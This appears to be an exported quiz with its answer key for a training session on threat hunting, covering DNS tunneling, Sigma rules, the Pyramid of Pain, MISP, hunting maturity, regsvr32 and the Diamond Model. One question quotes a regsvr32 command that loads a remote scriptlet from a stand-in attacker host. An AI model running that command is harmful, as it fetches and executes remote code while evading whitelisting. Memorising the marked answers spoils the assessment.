quiz.name: Session 07 Final Quiz: Cyber Threat Hunting and Intelligence Gathering
quiz.description: Final mastery assessment for Session 07. 7 multiple choice questions. Passing score: 5/7.

questiontext.text: An analyst discovers that a host in the environment has made 1,847 DNS queries in 24 hours — compared to the environment baseline of ~55 queries/day. Most of the queries are for TXT records with random-looking subdomain names like a3f2.telemetry-check.io. What technique is MOST likely being used?

answer.text: T1566.001 - Spearphishing Attachment

feedback.text: Spearphishing describes initial access via malicious email attachments. The DNS anomaly pattern described here occurs post-compromise, not during initial delivery.

answer.text: T1071.004 - Application Layer Protocol: DNS (DNS Tunneling)

feedback.text: Correct. High-volume DNS TXT record queries to random subdomains of a single domain is a signature pattern of DNS tunneling. Attackers encode C2 commands in DNS TXT responses and exfiltrate data in DNS query subdomains, because DNS is almost universally allowed through firewalls.

answer.text: T1018 - Remote System Discovery

feedback.text: Remote System Discovery involves enumerating other systems on the network (e.g., using net.exe, arp, ping). High-volume DNS TXT queries are not characteristic of discovery.

answer.text: T1048.003 - Exfiltration Over Alternative Protocol

feedback.text: While DNS tunneling can be used for exfiltration, T1048.003 specifically refers to non-standard protocols like DNS or ICMP for exfiltration. The broader C2+exfiltration pattern via DNS is best captured by T1071.004. T1048.003 is also a valid answer if exfiltration is confirmed, but T1071.004 is more specific to the described pattern.

name.text: Final Q2: Sigma Rule Condition Field

questiontext.text: When writing a Sigma rule, what is the purpose of the condition field in the detection section?

answer.text: It specifies the SIEM platform the rule is written for.

feedback.text: Sigma rules are SIEM-independent. The target SIEM is specified during conversion (e.g., sigma-cli -t splunk). The condition field is not platform-specific.

answer.text: It defines the log source type and product the rule applies to.

feedback.text: Log source (type, product, service) is defined in the logsource section of a Sigma rule, not the condition.

answer.text: It expresses the boolean logic combining selection and filter blocks to determine when an alert fires.

feedback.text: Correct. The condition field in Sigma detection uses boolean operators (and, or, not) and quantifiers (1 of, all of) to combine named selection and filter blocks. Example: "selection_main and not filter_legitimate" means: match the selection AND exclude the filter. This determines exactly when the rule fires.

answer.text: It sets the alert severity level (informational, low, medium, high, critical).

feedback.text: Severity is defined in the top-level level field of a Sigma rule (e.g., level: high). The condition field handles matching logic, not severity.

name.text: Final Q3: Pyramid of Pain Top Level

questiontext.text: The Pyramid of Pain model categorizes indicators by how difficult they are for attackers to change. Which type of indicator sits at the TOP of the pyramid, representing the most painful (difficult) change for an attacker?

answer.text: File hashes (MD5, SHA256)

feedback.text: File hashes sit at the BOTTOM of the Pyramid of Pain — they are the easiest for attackers to change (trivial: just modify one byte). They have the least impact when used as the primary detection mechanism.

answer.text: IP addresses

feedback.text: IP addresses are near the bottom of the pyramid — Easy to change. Attackers can spin up new infrastructure in minutes or use VPNs and proxies to rotate IPs rapidly.

answer.text: Domain names

feedback.text: Domain names are low on the pyramid — Simple to change. New domains cost under $10 and can be registered anonymously. Attackers rotate domain infrastructure regularly.

answer.text: Tactics, Techniques, and Procedures (TTPs)

feedback.text: Correct. TTPs sit at the top of the Pyramid of Pain. Changing fundamental tradecraft — how an attacker operates, what tools they prefer, how they achieve their goals — requires significant effort, retraining, and new tool development. When defenders detect at the TTP level, they force attackers to make expensive changes to their operations.

name.text: Final Q4: MISP Attributes vs Objects

questiontext.text: In MISP, what is the difference between an Attribute and an Object?

answer.text: Attributes are used for IP addresses only; Objects are used for all other indicator types.

feedback.text: Incorrect. Attributes can be any indicator type in MISP — ip-dst, domain, sha256, email-src, filename, etc. The distinction is not by type but by complexity (single data point vs. grouped entity).

answer.text: Attributes are single data points (e.g., one IP or one hash); Objects group multiple related attributes representing a single entity (e.g., a file with its name, hash, and size).

feedback.text: Correct. An Attribute is one piece of data (type + value). An Object uses a template to group multiple attributes that describe the same real-world entity — for example, a malware file Object contains filename, sha256, md5, size-in-bytes, and mimetype as separate but linked attributes.

answer.text: Attributes require manual creation; Objects are automatically imported from threat feeds.

feedback.text: Both attributes and objects can be created manually or imported. The distinction has nothing to do with the creation method.

answer.text: Attributes are shared publicly; Objects are kept private to your organization.

feedback.text: Sharing in MISP is controlled by the event's distribution setting and tags (TLP), not by whether something is an attribute or object.

name.text: Final Q5: Threat Hunting Maturity Level

questiontext.text: Your organization uses the threat hunting maturity model. Currently, your team performs ad-hoc searches for IOCs from threat feeds (e.g., looking up whether any known-bad IP appeared in your firewall logs). What maturity level does this represent, and what is the MOST important capability to develop next to advance to the next level?

answer.text: Level 0; advance by deploying a SIEM

feedback.text: Level 0 is purely reactive with no proactive hunting at all. IOC-based searching (even if ad-hoc) represents Level 1. A SIEM would be needed at Level 0, but this team is already past that point.

answer.text: Level 1; advance by developing hypothesis-driven hunts based on ATT&CK techniques

feedback.text: Correct. Searching for known IOCs from feeds is Level 1 (Minimal). Advancing to Level 2 (Procedural) requires moving beyond IOC searches to hypothesis-driven, TTP-based hunting using ATT&CK techniques as hunting targets, with documented procedures and reusable queries.

answer.text: Level 2; advance by implementing statistical anomaly detection

feedback.text: Level 2 is procedural/TTP-based hunting. Statistical anomaly detection characterizes Level 3 (Innovative). The team described has not yet reached Level 2.

answer.text: Level 3; advance by automating all detection into continuous pipelines

feedback.text: Continuous automated hunting characterizes Level 4. Ad-hoc IOC searching is Level 1, far from Level 3.

questiontext.text: During a threat hunt, you find that regsvr32.exe executed with the argument /i:https://attacker.com/payload.sct scrobj.dll. Which ATT&CK technique does this represent, and why is it significant?

answer.text: T1059.001 - PowerShell; because regsvr32 is used to bypass PowerShell restrictions

feedback.text: This technique does not involve PowerShell. Regsvr32 directly executes COM scriptlets (.sct files) without invoking PowerShell.

answer.text: T1218.010 - System Binary Proxy Execution: Regsvr32; because regsvr32 is a trusted Windows binary that can execute remote scripts while bypassing application whitelisting

feedback.text: Correct. This is the "Squiblydoo" technique (T1218.010). Regsvr32.exe is a signed Windows binary in System32. The /i: flag with a URL allows loading a remote COM scriptlet (.sct file). Because it's a trusted signed binary, it bypasses AppLocker and WDAC application whitelisting. Scrobj.dll is the script runtime that processes the .sct file.

answer.text: T1190 - Exploit Public-Facing Application; because the attack came from an external URL

feedback.text: T1190 is about exploiting vulnerabilities in internet-facing applications for initial access. This event occurs post-compromise, with regsvr32 loading a payload — this is execution/defense evasion, not initial access.

answer.text: T1105 - Ingress Tool Transfer; because a file is downloaded from the internet

feedback.text: T1105 covers downloading additional tools/payloads from the internet. While a download occurs, the more specific and significant technique here is the use of regsvr32 as a trusted binary to bypass defenses (T1218.010), which is the primary significance of this finding.

questiontext.text: What is the Diamond Model of Intrusion Analysis primarily used for?

answer.text: Scoring the severity of a security incident based on business impact

feedback.text: Severity scoring is typically done with frameworks like CVSS (for vulnerabilities) or custom risk matrices. The Diamond Model is an analytical framework, not a scoring system.

answer.text: Mapping detected attacks to MITRE ATT&CK techniques in a standardized format

feedback.text: ATT&CK technique mapping is done using the MITRE ATT&CK framework itself. The Diamond Model predates ATT&CK and focuses on the relationships between four intrusion elements, not technique classification.

answer.text: Analyzing the relationships between adversary, infrastructure, capability, and victim to pivot and find related intrusions

feedback.text: Correct. The Diamond Model (Caltagirone, Pendergast, Betz 2013) represents intrusions as four core features: Adversary, Infrastructure, Capability, and Victim. Its primary analytical value is enabling pivoting — using known elements to discover unknown ones. For example, if you identify the adversary's infrastructure, you can pivot to find other victims; if you identify the malware capability, you can find other actors who use the same tool.

answer.text: Calculating the minimum detection time required to prevent a given type of data breach

feedback.text: The Diamond Model does not calculate detection times. It is a qualitative analytical framework for understanding intrusion relationships, not a quantitative time-based model.
